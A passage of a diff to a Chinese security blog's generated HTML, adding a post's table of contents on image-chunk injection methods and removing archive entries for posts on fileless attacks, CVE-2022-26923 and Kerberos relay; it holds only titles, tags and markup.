href="#%E6%96%B9%E6%B3%95%E5%9B%9B-IDAT%E5%9D%97%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.1.</span> <span class="toc-text">方法四 IDAT块注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IMAGICK%E5%BA%93%E8%B0%83%E6%95%B4%E5%9B%BE%E5%83%8F%E5%A4%A7%E5%B0%8F"><span class="toc-number">3.4.</span> <span class="toc-text">IMAGICK库调整图像大小</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%94-%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%87%E6%9C%AC%E5%9D%97%E6%B3%A8%E5%85%A5"><span class="toc-number">3.4.1.</span> <span class="toc-text">方法五 自定义文本块注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/%E5%B8%B8%E8%A7%81%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/" class="archive-article-date">
-        <time datetime="2022-08-18T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-08-19</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/%E5%B8%B8%E8%A7%81%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/">常见无文件落地攻击方法总结</a>
-	
-    </h1>
-  
+        
+    </div>
+</aside>
 
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">总结</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">无文件落地</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/CVE-2022-26923%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="archive-article-date">
-        <time datetime="2022-05-11T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-05-12</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/CVE-2022-26923%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">CVE-2022-26923域权限提升漏洞复现</a>
-	
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞利用</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/kerberos%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB/" class="archive-article-date">
-        <time datetime="2022-03-10T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-11</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/kerberos%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB/">kerberos中继攻击</a>
-	
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">kerberos</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">中继</a>
-        		</li>
-      		
-		</ul>
-	</div>
 
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
 
-    
+
+
+
 
 
           </div>
@@ -530,8 +808,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
